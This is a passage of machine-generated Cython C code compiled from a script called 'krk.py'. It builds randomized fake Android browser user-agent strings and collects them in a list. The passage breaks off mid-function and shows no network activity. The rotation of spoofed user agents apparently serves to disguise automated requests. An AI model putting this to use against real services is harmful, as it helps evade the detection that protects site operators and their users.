    PyList_SET_ITEM(__pyx_t_6, 12, __pyx_n_s_M);
    __Pyx_INCREF(__pyx_n_s_N);
    __Pyx_GIVEREF(__pyx_n_s_N);
    PyList_SET_ITEM(__pyx_t_6, 13, __pyx_n_s_N);
    __Pyx_INCREF(__pyx_n_s_O);
    __Pyx_GIVEREF(__pyx_n_s_O);
    PyList_SET_ITEM(__pyx_t_6, 14, __pyx_n_s_O);
    __Pyx_INCREF(__pyx_n_s_P);
    __Pyx_GIVEREF(__pyx_n_s_P);
    PyList_SET_ITEM(__pyx_t_6, 15, __pyx_n_s_P);
    __Pyx_INCREF(__pyx_n_s_Q);
    __Pyx_GIVEREF(__pyx_n_s_Q);
    PyList_SET_ITEM(__pyx_t_6, 16, __pyx_n_s_Q);
    __Pyx_INCREF(__pyx_n_s_R);
    __Pyx_GIVEREF(__pyx_n_s_R);
    PyList_SET_ITEM(__pyx_t_6, 17, __pyx_n_s_R);
    __Pyx_INCREF(__pyx_n_s_S);
    __Pyx_GIVEREF(__pyx_n_s_S);
    PyList_SET_ITEM(__pyx_t_6, 18, __pyx_n_s_S);
    __Pyx_INCREF(__pyx_n_s_T);
    __Pyx_GIVEREF(__pyx_n_s_T);
    PyList_SET_ITEM(__pyx_t_6, 19, __pyx_n_s_T);
    __Pyx_INCREF(__pyx_n_s_U);
    __Pyx_GIVEREF(__pyx_n_s_U);
    PyList_SET_ITEM(__pyx_t_6, 20, __pyx_n_s_U);
    __Pyx_INCREF(__pyx_n_s_V);
    __Pyx_GIVEREF(__pyx_n_s_V);
    PyList_SET_ITEM(__pyx_t_6, 21, __pyx_n_s_V);
    __Pyx_INCREF(__pyx_n_s_W);
    __Pyx_GIVEREF(__pyx_n_s_W);
    PyList_SET_ITEM(__pyx_t_6, 22, __pyx_n_s_W);
    __Pyx_INCREF(__pyx_n_s_X);
    __Pyx_GIVEREF(__pyx_n_s_X);
    PyList_SET_ITEM(__pyx_t_6, 23, __pyx_n_s_X);
    __Pyx_INCREF(__pyx_n_s_Y);
    __Pyx_GIVEREF(__pyx_n_s_Y);
    PyList_SET_ITEM(__pyx_t_6, 24, __pyx_n_s_Y);
    __Pyx_INCREF(__pyx_n_s_Z);
    __Pyx_GIVEREF(__pyx_n_s_Z);
    PyList_SET_ITEM(__pyx_t_6, 25, __pyx_n_s_Z);
    __pyx_t_7 = NULL;
    __pyx_t_8 = 0;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
      __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_3);
      if (likely(__pyx_t_7)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
        __Pyx_INCREF(__pyx_t_7);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_3, function);
        __pyx_t_8 = 1;
      }
    }
    {
      PyObject *__pyx_callargs[2] = {__pyx_t_7, __pyx_t_6};
      __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_8, 1+__pyx_t_8);
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 36, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    }
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_d, __pyx_t_2) < 0) __PYX_ERR(0, 36, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    /* "krk.py":37
 *         c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
 *         d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
 *         e=random.randrange(1, 999)             # <<<<<<<<<<<<<<
 *         f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
 *         g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
 */
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 37, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_randrange); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 37, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__93, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 37, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_e, __pyx_t_2) < 0) __PYX_ERR(0, 37, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    /* "krk.py":38
 *         d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
 *         e=random.randrange(1, 999)
 *         f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])             # <<<<<<<<<<<<<<
 *         g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
 *         h=random.randrange(73,100)
 */
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 38, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_choice); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 38, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_3 = PyList_New(26); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 38, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_INCREF(__pyx_n_s_A);
    __Pyx_GIVEREF(__pyx_n_s_A);
    PyList_SET_ITEM(__pyx_t_3, 0, __pyx_n_s_A);
    __Pyx_INCREF(__pyx_n_s_B);
    __Pyx_GIVEREF(__pyx_n_s_B);
    PyList_SET_ITEM(__pyx_t_3, 1, __pyx_n_s_B);
    __Pyx_INCREF(__pyx_n_s_C);
    __Pyx_GIVEREF(__pyx_n_s_C);
    PyList_SET_ITEM(__pyx_t_3, 2, __pyx_n_s_C);
    __Pyx_INCREF(__pyx_n_s_D);
    __Pyx_GIVEREF(__pyx_n_s_D);
    PyList_SET_ITEM(__pyx_t_3, 3, __pyx_n_s_D);
    __Pyx_INCREF(__pyx_n_s_E);
    __Pyx_GIVEREF(__pyx_n_s_E);
    PyList_SET_ITEM(__pyx_t_3, 4, __pyx_n_s_E);
    __Pyx_INCREF(__pyx_n_s_F);
    __Pyx_GIVEREF(__pyx_n_s_F);
    PyList_SET_ITEM(__pyx_t_3, 5, __pyx_n_s_F);
    __Pyx_INCREF(__pyx_n_s_G);
    __Pyx_GIVEREF(__pyx_n_s_G);
    PyList_SET_ITEM(__pyx_t_3, 6, __pyx_n_s_G);
    __Pyx_INCREF(__pyx_n_s_H);
    __Pyx_GIVEREF(__pyx_n_s_H);
    PyList_SET_ITEM(__pyx_t_3, 7, __pyx_n_s_H);
    __Pyx_INCREF(__pyx_n_s_I);
    __Pyx_GIVEREF(__pyx_n_s_I);
    PyList_SET_ITEM(__pyx_t_3, 8, __pyx_n_s_I);
    __Pyx_INCREF(__pyx_n_s_J);
    __Pyx_GIVEREF(__pyx_n_s_J);
    PyList_SET_ITEM(__pyx_t_3, 9, __pyx_n_s_J);
    __Pyx_INCREF(__pyx_n_s_K);
    __Pyx_GIVEREF(__pyx_n_s_K);
    PyList_SET_ITEM(__pyx_t_3, 10, __pyx_n_s_K);
    __Pyx_INCREF(__pyx_n_s_L);
    __Pyx_GIVEREF(__pyx_n_s_L);
    PyList_SET_ITEM(__pyx_t_3, 11, __pyx_n_s_L);
    __Pyx_INCREF(__pyx_n_s_M);
    __Pyx_GIVEREF(__pyx_n_s_M);
    PyList_SET_ITEM(__pyx_t_3, 12, __pyx_n_s_M);
    __Pyx_INCREF(__pyx_n_s_N);
    __Pyx_GIVEREF(__pyx_n_s_N);
    PyList_SET_ITEM(__pyx_t_3, 13, __pyx_n_s_N);
    __Pyx_INCREF(__pyx_n_s_O);
    __Pyx_GIVEREF(__pyx_n_s_O);
    PyList_SET_ITEM(__pyx_t_3, 14, __pyx_n_s_O);
    __Pyx_INCREF(__pyx_n_s_P);
    __Pyx_GIVEREF(__pyx_n_s_P);
    PyList_SET_ITEM(__pyx_t_3, 15, __pyx_n_s_P);
    __Pyx_INCREF(__pyx_n_s_Q);
    __Pyx_GIVEREF(__pyx_n_s_Q);
    PyList_SET_ITEM(__pyx_t_3, 16, __pyx_n_s_Q);
    __Pyx_INCREF(__pyx_n_s_R);
    __Pyx_GIVEREF(__pyx_n_s_R);
    PyList_SET_ITEM(__pyx_t_3, 17, __pyx_n_s_R);
    __Pyx_INCREF(__pyx_n_s_S);
    __Pyx_GIVEREF(__pyx_n_s_S);
    PyList_SET_ITEM(__pyx_t_3, 18, __pyx_n_s_S);
    __Pyx_INCREF(__pyx_n_s_T);
    __Pyx_GIVEREF(__pyx_n_s_T);
    PyList_SET_ITEM(__pyx_t_3, 19, __pyx_n_s_T);
    __Pyx_INCREF(__pyx_n_s_U);
    __Pyx_GIVEREF(__pyx_n_s_U);
    PyList_SET_ITEM(__pyx_t_3, 20, __pyx_n_s_U);
    __Pyx_INCREF(__pyx_n_s_V);
    __Pyx_GIVEREF(__pyx_n_s_V);
    PyList_SET_ITEM(__pyx_t_3, 21, __pyx_n_s_V);
    __Pyx_INCREF(__pyx_n_s_W);
    __Pyx_GIVEREF(__pyx_n_s_W);
    PyList_SET_ITEM(__pyx_t_3, 22, __pyx_n_s_W);
    __Pyx_INCREF(__pyx_n_s_X);
    __Pyx_GIVEREF(__pyx_n_s_X);
    PyList_SET_ITEM(__pyx_t_3, 23, __pyx_n_s_X);
    __Pyx_INCREF(__pyx_n_s_Y);
    __Pyx_GIVEREF(__pyx_n_s_Y);
    PyList_SET_ITEM(__pyx_t_3, 24, __pyx_n_s_Y);
    __Pyx_INCREF(__pyx_n_s_Z);
    __Pyx_GIVEREF(__pyx_n_s_Z);
    PyList_SET_ITEM(__pyx_t_3, 25, __pyx_n_s_Z);
    __pyx_t_7 = NULL;
    __pyx_t_8 = 0;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
      __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_6);
      if (likely(__pyx_t_7)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
        __Pyx_INCREF(__pyx_t_7);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_6, function);
        __pyx_t_8 = 1;
      }
    }
    {
      PyObject *__pyx_callargs[2] = {__pyx_t_7, __pyx_t_3};
      __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_8, 1+__pyx_t_8);
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 38, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    }
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_f, __pyx_t_2) < 0) __PYX_ERR(0, 38, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    /* "krk.py":39
 *         e=random.randrange(1, 999)
 *         f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
 *         g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'             # <<<<<<<<<<<<<<
 *         h=random.randrange(73,100)
 *         i='0'
 */
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_g, __pyx_kp_s_AppleWebKit_537_36_KHTML_like_Ge_2) < 0) __PYX_ERR(0, 39, __pyx_L1_error)

    /* "krk.py":40
 *         f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
 *         g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
 *         h=random.randrange(73,100)             # <<<<<<<<<<<<<<
 *         i='0'
 *         j=random.randrange(4200,4900)
 */
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 40, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_randrange); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 40, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple__88, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 40, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_h, __pyx_t_2) < 0) __PYX_ERR(0, 40, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    /* "krk.py":41
 *         g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
 *         h=random.randrange(73,100)
 *         i='0'             # <<<<<<<<<<<<<<
 *         j=random.randrange(4200,4900)
 *         k=random.randrange(40,150)
 */
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_i, __pyx_kp_s_0) < 0) __PYX_ERR(0, 41, __pyx_L1_error)

    /* "krk.py":42
 *         h=random.randrange(73,100)
 *         i='0'
 *         j=random.randrange(4200,4900)             # <<<<<<<<<<<<<<
 *         k=random.randrange(40,150)
 *         l='Mobile Safari/533.1'
 */
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 42, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_randrange); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 42, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple__89, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 42, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_j, __pyx_t_2) < 0) __PYX_ERR(0, 42, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    /* "krk.py":43
 *         i='0'
 *         j=random.randrange(4200,4900)
 *         k=random.randrange(40,150)             # <<<<<<<<<<<<<<
 *         l='Mobile Safari/533.1'
 *         fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
 */
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 43, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_randrange); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 43, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple__90, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 43, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_k, __pyx_t_2) < 0) __PYX_ERR(0, 43, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    /* "krk.py":44
 *         j=random.randrange(4200,4900)
 *         k=random.randrange(40,150)
 *         l='Mobile Safari/533.1'             # <<<<<<<<<<<<<<
 *         fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
 *         ugen.append(fullagnt)
 */
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_l, __pyx_kp_s_Mobile_Safari_533_1) < 0) __PYX_ERR(0, 44, __pyx_L1_error)

    /* "krk.py":45
 *         k=random.randrange(40,150)
 *         l='Mobile Safari/533.1'
 *         fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')             # <<<<<<<<<<<<<<
 *         ugen.append(fullagnt)
 * logo=("""\033[1;32m
 */
    __pyx_t_2 = PyTuple_New(19); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_11 = 0;
    __pyx_t_12 = 127;
    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_aa); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_6, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_12;
    __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
    __Pyx_GIVEREF(__pyx_t_3);
    PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_t_3);
    __pyx_t_3 = 0;
    __Pyx_INCREF(__pyx_kp_u__22);
    __pyx_t_11 += 1;
    __Pyx_GIVEREF(__pyx_kp_u__22);
    PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_kp_u__22);
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_b); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_12;
    __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
    __Pyx_GIVEREF(__pyx_t_6);
    PyTuple_SET_ITEM(__pyx_t_2, 2, __pyx_t_6);
    __pyx_t_6 = 0;
    __Pyx_INCREF(__pyx_kp_u__91);
    __pyx_t_11 += 2;
    __Pyx_GIVEREF(__pyx_kp_u__91);
    PyTuple_SET_ITEM(__pyx_t_2, 3, __pyx_kp_u__91);
    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_c); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_6, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_12;
    __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
    __Pyx_GIVEREF(__pyx_t_3);
    PyTuple_SET_ITEM(__pyx_t_2, 4, __pyx_t_3);
    __pyx_t_3 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_d); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_12;
    __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
    __Pyx_GIVEREF(__pyx_t_6);
    PyTuple_SET_ITEM(__pyx_t_2, 5, __pyx_t_6);
    __pyx_t_6 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_e); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_6, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_12;
    __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
    __Pyx_GIVEREF(__pyx_t_3);
    PyTuple_SET_ITEM(__pyx_t_2, 6, __pyx_t_3);
    __pyx_t_3 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_f); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_12;
    __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
    __Pyx_GIVEREF(__pyx_t_6);
    PyTuple_SET_ITEM(__pyx_t_2, 7, __pyx_t_6);
    __pyx_t_6 = 0;
    __Pyx_INCREF(__pyx_kp_u__92);
    __pyx_t_11 += 2;
    __Pyx_GIVEREF(__pyx_kp_u__92);
    PyTuple_SET_ITEM(__pyx_t_2, 8, __pyx_kp_u__92);
    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_g); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_6, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_12;
    __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
    __Pyx_GIVEREF(__pyx_t_3);
    PyTuple_SET_ITEM(__pyx_t_2, 9, __pyx_t_3);
    __pyx_t_3 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_h); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_12;
    __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
    __Pyx_GIVEREF(__pyx_t_6);
    PyTuple_SET_ITEM(__pyx_t_2, 10, __pyx_t_6);
    __pyx_t_6 = 0;
    __Pyx_INCREF(__pyx_kp_u__72);
    __pyx_t_11 += 1;
    __Pyx_GIVEREF(__pyx_kp_u__72);
    PyTuple_SET_ITEM(__pyx_t_2, 11, __pyx_kp_u__72);
    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_i); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_6, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_12;
    __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
    __Pyx_GIVEREF(__pyx_t_3);
    PyTuple_SET_ITEM(__pyx_t_2, 12, __pyx_t_3);
    __pyx_t_3 = 0;
    __Pyx_INCREF(__pyx_kp_u__72);
    __pyx_t_11 += 1;
    __Pyx_GIVEREF(__pyx_kp_u__72);
    PyTuple_SET_ITEM(__pyx_t_2, 13, __pyx_kp_u__72);
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_j); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_12;
    __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
    __Pyx_GIVEREF(__pyx_t_6);
    PyTuple_SET_ITEM(__pyx_t_2, 14, __pyx_t_6);
    __pyx_t_6 = 0;
    __Pyx_INCREF(__pyx_kp_u__72);
    __pyx_t_11 += 1;
    __Pyx_GIVEREF(__pyx_kp_u__72);
    PyTuple_SET_ITEM(__pyx_t_2, 15, __pyx_kp_u__72);
    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_k); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_6, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 45, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
